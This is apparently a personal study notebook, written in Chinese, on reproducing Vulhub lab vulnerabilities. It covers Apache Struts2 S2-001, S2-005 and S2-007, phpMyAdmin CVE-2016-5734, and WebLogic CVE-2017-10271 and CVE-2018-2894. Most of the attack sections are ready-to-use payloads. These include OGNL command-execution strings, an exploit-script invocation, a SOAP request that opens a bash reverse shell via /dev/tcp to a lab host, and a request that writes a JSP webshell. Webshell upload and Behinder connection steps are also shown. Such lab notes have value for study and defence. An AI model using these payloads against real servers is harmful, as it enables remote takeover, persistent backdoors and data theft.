# Struts2漏洞

> | Struts 漏洞列表 |                                                              |
> | --------------- | ------------------------------------------------------------ |
> |                 | S2-001 利用表单错误进行远程代码利用                          |
> |                 | S2-002 标签 <s:url>和<s:a> XSS漏洞                           |
> |                 | S2-003 XWork ParameterInterceptors 绕过导致OGNL执行          |
> |                 | S2-004 提供静态文件时目录遍历漏洞                            |
> |                 | S2-005 XWork ParameterInterceptors 绕过远程代码执行          |
> |                 | S2-006 XWork生成错误页面时的XSS漏洞                          |
> |                 | S2-007 当存在错误转换时，用户输入被当作OGNL执行              |
> |                 | S2-008 Struts2的一些严重(多个)                               |
> |                 | S2-009 ParameterInterceptor漏洞允许远程代码执行              |
> |                 | S2-010 当使用 Struts2 token机制防护CSRF漏洞时，滥用已知会话属性可能绕过token检测 |
> |                 | S2-011 长请求参数名称可能会提高DOS攻击                       |
> |                 | S2-012 Showcase app漏洞可能导致远程代码执行                  |
> |                 | S2-013 存在于URL和Anchor Tag的includeParams属性中的漏洞允许远程执行命令 |
> |                 | S2-014 通过在URL和Anchor Tag中强制插入参数引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击 |
> |                 | S2-015 由通配符匹配机制引入的漏洞或OGNL Expression的双重评估允许远程命令执行。 |
> |                 | S2-016 通过操作带有前缀'action：'/'redirect：'/'redirectAction：'的参数引入的漏洞允许远程命令执行 |
> |                 | S2-017 - 通过操作以“redirect：”/“redirectAction：”为前缀的参数引入的漏洞允许打开重定向 |
> |                 | S2-018 Apache Struts2中的访问控制漏洞                        |
> |                 | S2-019 - 默认禁用动态方法调用                                |
> |                 | S2-020 将Common Commons FileUpload升级到版本1.3.1（避免DoS攻击），并添加“class”来排除ParametersInterceptor中的参数（避免ClassLoader操作） |
> |                 | S2-021 - 改进ParametersInterceptor和CookieInterceptor中的排除参数以避免ClassLoader操作 |
> |                 | S2-022 - 在CookieInterceptor中扩展排除参数以避免操纵Struts内部 |
> |                 | S2-023 - 令牌的生成值可以预测                                |
> |                 | S2-024 - 错误的excludeParams覆 DefaultExcludedPatternsChecker |
> |                 | S2-025 - 调试模式下和暴露的JSP文件中的跨站点脚本漏洞         |
> |                 | S2-026中定义的错误 - 特殊顶级对象可用于访问Struts的内部结构  |
> |                 | S2-027 - TextParseUtil.translateVariables不会过滤恶意的OGNL表达式 |
> |                 | S2-028 - 使用具有破坏的URLDecoder实现的JRE可能导致基于Struts 2的Web应用程序出现XSS漏洞。 |
> |                 | S2-029 - 对标签属性中的原始用户输入进行评估时，强制双重OGNL评估可能导致远程代码执行。 |
> |                 | S2-030 - I18NInterceptor                                     |
> |                 | S2-031中可能的XSS漏洞 - XSLTResult可用于解析任意样式表       |
> |                 | S2-032 - 启用动态方法调用时，可以通过方法：前缀执行远程代码执行。 |
> |                 | S2-033 - 使用REST插件时可以执行远程代码执行！运行时动态方法调用启用。 |
> |                 | S2-034 - OGNL缓存中毒可能导致DoS漏洞                         |
> |                 | S2-035 - 动作名称清理很容易出错                              |
> |                 | S2-036 - 强制性双重OGNL评估，当对原始用户输入的标记属性进行评估时，可能会导致远程代码执行（类似于S2-029） |
> |                 | S2-037 - 使用REST插件时可以执行远程代码执行。                |
> |                 | S2-038 - 可以绕过令牌验证并执行CSRF攻击                      |
> |                 | S2-039 - Getter作为操作方法导致安全绕过                      |
> |                 | S2-040 - 使用现有默认操作方法进行输入验证旁路。              |
> |                 | S2-041 - 使用URLValidator                                    |
> |                 | S2-042 - 时可能发生DoS攻击 - Convention插件中可能的路径遍历  |
> |                 | S2-043 - 使用产品中的Config Browser插件                      |
> |                 | S2-044 - 使用URLValidator                                    |
> |                 | S2-045时可能发生DoS攻击 - 基于Jakarta Multipart解析器执行文件上传时可能的远程执行代码。 |
> |                 | S2-046 - 基于Jakarta Multipart解析器（类似于S2-045）执行文件上传时的可能RCE |
> |                 | S2-047 - 使用URLValidator时可能的DoS攻击（类似于S2-044）     |
> |                 | S2-048 - 可能的RCE Struts展示应用程序Struts 2.3.x系列中的Struts 1插件示例 |
> |                 | S2-049 - DoS攻击可用于Spring受保护的操作                     |
> |                 | S2-050  - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044＆ S2-047） |
> |                 | S2-051 - 当使用Struts REST插件时，远程攻击者可能通过发送精心设计的xml请求来创建DoS攻击 |
> |                 | S2-052 - 使用带XStream处理程序的Struts REST插件处理XML时可能发生的远程执行代码攻击有效载荷 |
> |                 | S2-053 - 在Freemarker标记中使用非意图表达而不是字符串文字时可能发生的远程执行代码攻击 |
> |                 | S2-054 - ApacheStruts REST插件使用了过时的JSON-lib库，击者可以通过构造特制的JSON恶意请求造成DOS攻击。 |
> |                 | S2- 055 - 由于ApacheStruts调用了存在反序列化漏洞的Jackson JSON库，导致了反序列化漏洞的产生。 |
> |                 | S2-056	-	当使用XStream组件对XML格式的数据包进行反序列化操作，且未对数据内容进行有效验证时，攻击者可通过提交恶意XML数据对应用进行远程DoS攻击。 |

## S2-001 远程代码执行漏洞

> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行

**几个重要的文件**

`index.jps`

~~~jsp
<html>
<head>
  <title>用户登录</title>
</head>
<body>
<h1>用户登录</h1>
<s:form action="login">
  <s:textfield name="username" label="username" />
  <s:textfield name="password" label="password" />
  <s:submit></s:submit>
</s:form>
</body>
</html>

~~~

`struts.xml`

~~~xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
    <package name="s2-001" extends="struts-default">
        <action name="login" class="com.test.LoginAction">
            <result name="success">/success.jsp</result>
            <result name="error">/index.jsp</result>
        </action>
    </package>
</struts>
~~~

`web.xml`

~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list>
</web-app>
~~~





1. 登录失败的时候： **账号和密码会显示在信息框里**

   ![image-20220525151054931](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220525151054931.png)

2. 测试漏洞：当我们在账号框或密码框处输入这样一个字符串时`%{1+1}`（`%`需编码为%25）会被解析成2，说明存在s2-001漏洞

   ![image-20220525151315549](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220525151315549.png)

3. 从而利用这一特性，可以构造一些命令执行语句  

   获取tomcat路径

   ~~~java
   %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
   ~~~

   ![image-20220525152447499](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220525152447499.png)

   获取 web 路径

   ~~~java
   %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
   
   ~~~

   ![image-20220525153329334](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220525153329334.png)

   

   命令执行

   ~~~java
   %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
   
   ~~~

   ![image-20220525153611385](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220525153611385.png)

   **漏洞原因：**
   
   > 阅读源码发现，究其原因，在于在`translateVariables`中，递归解析了表达式，在处理完`%{password}`后将`password`的值直接取出并继续在`while`循环中解析，若用户输入的`password`是恶意的`OGNL`表达式，比如`%{1+1}`，则得以解析执行。
   > 

## S2-005 远程代码执行漏洞

影响版本: 2.0.0 - 2.1.8.1 漏洞详情: http://struts.apache.org/docs/s2-005.html

### 原理

> S2-005漏洞起源源于S2-003（受影响版本：低于Struts 2.0.12），Struts2会将http的每个参数名解析为OGNL语句执行（可理解为Java代码 ）。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上

XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：

~~~java
user.address.city=Bishkek&user['favoriteDrink']=kumys 
//会被转化成
action.getUser().getAddress().setCity("Bishkek")  
action.getUser().setFavoriteDrink("kumys")
~~~

触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：

- S2-003 使用`\u0023`绕过s2对`#`的防御
- S2-003 后官方增加了安全模式（沙盒）
- S2-005 使用OGNL表达式将沙盒关闭，继续执行代码

### 环境

~~~dock
docker-compose build
docker-compose up -d
~~~



### POC &&EXP

执行任意命令POC（无回显，空格用`@`代替）：

~~~
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
~~~

![image-20220526155701683](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526155701683.png)

![image-20220526155632239](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526155632239.png)网上一些POC放到tomcat8下会返回400，研究了一下发现字符`\`、`"`不能直接放path里，需要urlencode，编码以后再发送就好了。这个POC没回显。但是命令成功执行，在/tmp目录下成功创建文件。

尝试更换命令为`ifconfig`或`pwd`等命令，并不回显任何消息。



### 使用工具 K8 Struts2 EXP

![image-20220526164952729](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526164952729.png)

 

上传木马：然后使用冰蝎连接

![image-20220526165037541](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526165037541.png)返回shell成功

![image-20220526165207998](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526165207998.png)

# S2-007 远程代码执行漏洞

影响版本：2.0.0-2.2.3  漏洞详情：http://struts.apache.org/docs/s2-007.html

### 测试环境搭建

```docker
docker-compose build
docker-compose up -d
```

### 原理

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：

~~~java
(...)
public class UserAction extends ActionSupport {
    private Integer age;
    private String name;
    private String email;

(...)
~~~

然后配置有UserAction-validation.xml:

~~~xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
    "-//OpenSymphony Group//XWork Validator 1.0//EN"
    "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
    <field name="age">
        <field-validator type="int">
            <param name="min">1</param>
            <param name="max">150</param>
        </field-validator>
    </field>
</validators>

~~~

当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。

因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（**弹计算器，无法在本项目环境下运行**）：

~~~
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
~~~

### Exploit

执行任意代码的EXP：

~~~~
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream())) + '
~~~~

![image-20220601173223701](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220601173223701.png)



# phpMyAdmin漏洞

## phpMyAdmin 4.0.x-- 4.6.2 远程代码执行漏洞（CVE-2016-5734）

phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进`preg_replace`函数第一个参数中。

在PHP5.4.7以前，`preg_replace`的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。

参考链接：[CVE-2016-5734 phpmyadmin后台代码执行漏洞复现 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7836)

### 漏洞复现

1. 漏洞利用的前提是phpmyadmin在登录的状态下
2. 复现

​		漏洞poc ： exploit-DB

​		使用exploit 上面提供的 poc 进行操作

~~~shell
python3 cve-2016-5734.py -u root --pwd="root" http://192.168.1.146:8080 -c "system('uname -a');
~~~

![image-20220526185830924](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220526185830924.png)其中可以使用 -c 指定PHP 代码执行（这里未指定使用代码中默认的system(‘uname -a’)）
-d 指定数据库名
-t 指定用户所创建的表名（这里未指定使用代码中默认的)
结果显示:result的那一行

# Weblogic 

## Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。



### 环境搭建

启动测试环境：

```
docker-compose up -d
```

等待一段时间，访问`http://your-ip:7001/`即可看到一个404页面，说明weblogic已成功启动。



### 漏洞复现

发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：

~~~http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.1.146:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 640

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.1.146/2233 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

~~~

**bp重发报文：**

![image-20220601182306870](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220601182306870.png)

**成功获得反弹shell:**

![image-20220601182356456](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220601182356456.png)

**写入webshell（访问：`http://your-ip:7001/bea_wls_internal/test.jsp`）：**

~~~http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.1.146:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
~~~

**成功写入文件内容：**![image-20220601182633385](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220601182633385.png)

### 工具直接利用

![image-20220601182825563](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220601182825563.png)



## Weblogic 任意文件上传漏洞（CVE-2018-2894）

Oracle在7月份更新中，修复了WebLogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page在生产模式下默认不开启，所以该漏洞有一定限制。

利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。

### 漏洞环境

执行如下命令，启动weblogic 12.2.1.3：

```
docker-compose up -d
```

环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面。

执行`docker-compose logs | grep password`可查看管理员密码，管理员用户名为`weblogic`。

登录后台页面，点击`base_domain`的配置，在“高级”中开启“启用 Web 服务测试页”选项：

![image-20220602154821168](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220602154821168.png)

### 漏洞复现



访问`http://your-ip:7001/ws_utc/config.do`，设置Work Home Dir为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。我将目录设置为`ws_utc`应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。

![img](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\2.png)

然后点击安全 -> 增加，然后上传webshell：

![image-20220602154910486](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220602154910486.png)









![image-20220602154706717](E:\md笔记资料\vulhub靶场漏洞学习笔记.assets\image-20220602154706717.png)然后访问`http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`，即可执行webshell：



然后使用冰蝎连接成功



